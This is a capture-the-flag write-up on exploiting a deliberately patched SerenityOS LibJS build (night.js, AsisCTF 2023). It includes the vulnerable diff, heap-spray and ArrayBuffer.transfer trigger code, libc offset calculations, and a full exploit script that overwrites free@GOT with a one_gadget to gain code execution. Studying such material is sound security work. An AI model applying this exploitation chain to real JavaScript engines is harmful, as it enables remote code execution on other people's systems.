---
layout: post
title:  "[AsisCTF Quals 2023] Attacking Javascript Engine libjs SerenityOS"
date:   2023-09-27
categories: ctf pwn pwnjs
description: This is a writeup for night.js pwn challenge
tags: tip-binary ctf
---

# Background

Asis CTF 2023 Quals has ended. I solved 3 out of 4 challenges, including `night.js`. Unfortunately, I solved `night.js` after the event had ended and read a write-up on Discord ;). This challenge helped me a lot to learn more about pwning the JavaScript interpreter. It's a JavaScript interpreter pwn challenge, which means we are attacking the JS binary/interpreter, not a JS web application.

# Challenge Analysis

We were given several filess, including Dockerfile, challenge patch, commit information, and more. After analyzing the challenge patch, I discovered that the patch will disables the `assertion` and `from_size` checks, allowing us to call the function `copy_data_block_bytes` with smaller size from the destination array. this can lead to arbitrary read or write.

{% highlight cpp %}
diff --git a/./Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp b/../patched-serenity/Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp
index 2f65f7b6ca..ee9a1ca00f 100644
--- a/./Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp
+++ b/../patched-serenity/Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp
@@ -80,10 +80,10 @@ void copy_data_block_bytes(ByteBuffer& to_block, u64 to_index, ByteBuffer const&
     VERIFY(from_index + count <= from_size);
 
     // 4. Let toSize be the number of bytes in toBlock.
-    auto to_size = to_block.size();
+    // auto to_size = to_block.size();
 
     // 5. Assert: toIndex + count ≤ toSize.
-    VERIFY(to_index + count <= to_size);
+    // VERIFY(to_index + count <= to_size);
 
     // 6. Repeat, while count > 0,
     while (count > 0) {
@@ -215,6 +215,7 @@ ThrowCompletionOr<ArrayBuffer*> array_buffer_copy_and_detach(VM& vm, ArrayBuffer
 
     // 10. Let copyLength be min(newByteLength, arrayBuffer.[[ArrayBufferByteLength]]).
     auto copy_length = min(new_byte_length, array_buffer.byte_length());
+    if(array_buffer.byte_length() > 0x100) copy_length = array_buffer.byte_length();
 
     // 11. Let fromBlock be arrayBuffer.[[ArrayBufferData]].
     // 12. Let toBlock be newBuffer.[[ArrayBufferData]].

{% endhighlight %}
 
With this information, we can trigger the vulnerability by using `ArrayBuffer.prototype.transfer()`,
which allow us to copy the contents of the array to a new array. In this case, we can create several array buffer, then modifying the appropriate array with a size of 0x100 then call `.transfer` to trigger the vulnerability.

{% highlight js %}

buffer_array = []
spary_array = []

// spraying the array buffer 0x50 times with 0x120 
for(var i = 0; i < 0x50; i++){
    buffer_array.push(new ArrayBuffer(0x120))
}

x = buffer_array[0x2f]
view = new BigUint64Array(x)

console.log(view)

// modify ArrayBuffer object 
view[0] = 0xdeadbeef0n
view[1] = 0xdeadbeef1n
view[2] = 0xdeadbeef2n
view[3] = 0xdeadbeef3n
view[4] = 0x100n // modify the size
view[5] = 1n // set to 1
view[6] = 1n // set to 1

{% endhighlight %}

now the value at `buffer_array[0x2f]` will stored at the memory location `array_address+0x0040` 

<img src="/images/pwnjs/1.png"/>
Yellow represents the address of the array, blue represents the value stored in the array. When we trigger `ArrayBuffer.prototype.transfer()`, the size of the copied array will 0x100.

{% highlight js %}

// trigger the vulnerability by allocating the new Array with smaller size
buffer2 = x.transfer(0x10)

{% endhighlight %}

The new array will be created with size `0x100`, which is equivalent to `256`. and this array will contains memory leaks.

<img src="/images/pwnjs/2.png">

We can use the memory leak to obtain `__libc_system` and the Array address. Our plan is to overwrite the `free@GOT` with the address of the `one_gadget`.

<img src="/images/pwnjs/3.png"> 

Before that, we can perform array spray-ing, which can be useful for performing a GOT overwrite.

{% highlight js %}

// spraying array
for(var i = 0; i <= 0x30; i++){
    spray_array.push(new ArrayBuffer(0x160))
}

// spraying array with string that can be useful to get shell or executing file
for(var i = 0; i <= 0xff; i++){
    v = new BigUint64Array(spray_array[i])
    // v[0] = 4702111234474983745n // /bin/sh 
    v[0] = 16653634245063215n
}

{% endhighlight %}

Now we can initialize a new array to read the stored memory inside `buffer2` which is the array with small size but has a size of `0x100`. 

{% highlight js %}

leak = new BigUint64Array(buffer2)
console.log(leak)

{% endhighlight %}

Not only read. We can also performing GOT overwrite by inserting the `free@got` address into `leak[16]`. Then create a new `big uint64` array using our `spray_array[0]` finally, we can modify `free@got` using the first index of the new `big uint64` array.

{% highlight js %}

leak[16] = __liblagomjs_freegot
v = new BigUint64Array(spray_array[0])
v[0] = __libc_system

{% endhighlight %}

We are overwriting `free@got` because the `liblagom-js.so.0.0.0` library lacks RELRO protection. Allowing us to freely overwrite the values in the GOT addresses within this library. Additionally, `free()` is used extensively throughout the binary.

<img src="/images/pwnjs/5.png"/>

Now, we can overwrite the `free@got` with `__libc_system`. In this case, I use `one_gadget` to simplify the process. Here is my full exploit code to achieve remote code execution (RCE). 

{% highlight js %}

function addrprnt(address){
    if (address === null || address === undefined){
        return 
    }else{
        return "0x" + address.toString(16);
    }
}

function edit_chunk_size(view, size){
    view[0] = 4702111234474983745n;
    view[1] = 4702111234474983745n;
    view[2] = 4702111234474983745n;
    view[3] = 4702111234474983745n;
    view[4] = size;
    view[5] = 1n;
    view[6] = 1n;
}

function memdump(array){
    // dumping buffer
    for(var i =0; i <= array.byteLength; i++){
        console.log("[+] dumping array["+ i +"] = " + addrprnt(array[i]))
    }
}



buffer_array = []
spray_array = []

// spraying the array buffer 0x50 times with 0x120 
for(var i = 0; i < 0x50; i++){
    buffer_array.push(new ArrayBuffer(0x120))
}

x = buffer_array[0x2f]
view = new BigUint64Array(x)

console.log(view)

// modify ArrayBuffer object 
view[0] = 0xdeadbeef0n
view[1] = 0xdeadbeef1n
view[2] = 0xdeadbeef2n
view[3] = 0xdeadbeef3n
view[4] = 0x100n // modify the size
view[5] = 1n // set to 1
view[6] = 1n // set to 1

// trigger the copied byte to buffer2 with smaller length of memory
buffer2 = x.transfer(0x10)
console.log(buffer2.byteLength)
console.log(buffer2)


// spraying array
for(var i = 0; i <= 0x30; i++){
    spray_array.push(new ArrayBuffer(0x160))
}

// spraying array 
for(var i = 0; i <= 0xff; i++){
    v = new BigUint64Array(spray_array[i])
    // v[0] = 4702111234474983745n // /bin/sh 
    v[0] = 16653634245063215n
}

// getting info leak
leak = new BigUint64Array(buffer2)
console.log(leak)

/* offset      liblagom-js.so.0.0.0 [free@got]= 0x00000069b420 */

leak_arraybuffer = leak[8]
leak_heapaddress = leak[10]
leak_strbinsh = leak[16]
__libc_baseaddress = leak_arraybuffer - 0xc19da8n
__libc_system = __libc_baseaddress + 0x50d60n
__libc_binsh = __libc_baseaddress + 0x1d8698n
__libc_puts = __libc_baseaddress + 0x80ed0n
__liblagomjs_baseaddress = leak_arraybuffer - 0x67dda8n
__liblagomjs_freegot = __liblagomjs_baseaddress + 0x00000069b420n
oneshot = __libc_baseaddress + 0xebcf8n

__libc_ret = __libc_baseaddress + 0x00000000000f872en
__libc_pop_rdi = __libc_baseaddress + 0x000000000002a3e5n

// memory leak
console.log('[+] address of ArrayBuffer: ' + addrprnt(leak_arraybuffer))
console.log('[+] address of base address of libc.so.6: ' + addrprnt(__libc_baseaddress))
console.log('[+] address of base address of liblagom-js.so.0.0.0: ' + addrprnt(__liblagomjs_baseaddress))
console.log('[+] address of free@got of liblagom-js.so.0.0.0: ' + addrprnt(__liblagomjs_freegot))
console.log('[+] address of __libc_system of libc.so.6: ' + addrprnt(__libc_system))
console.log('[+] address of heap: ' + addrprnt(leak_heapaddress))
console.log('[+] address of /bin/sh: ' + addrprnt(leak_strbinsh))

// gaining arbitrary write 
leak[16] = __liblagomjs_freegot
v = new BigUint64Array(spray_array[0])
console.log(v)
v[0] = oneshot

{% endhighlight %}

Run the exploit and we got RCE


<img src="/images/pwnjs/4.png"/>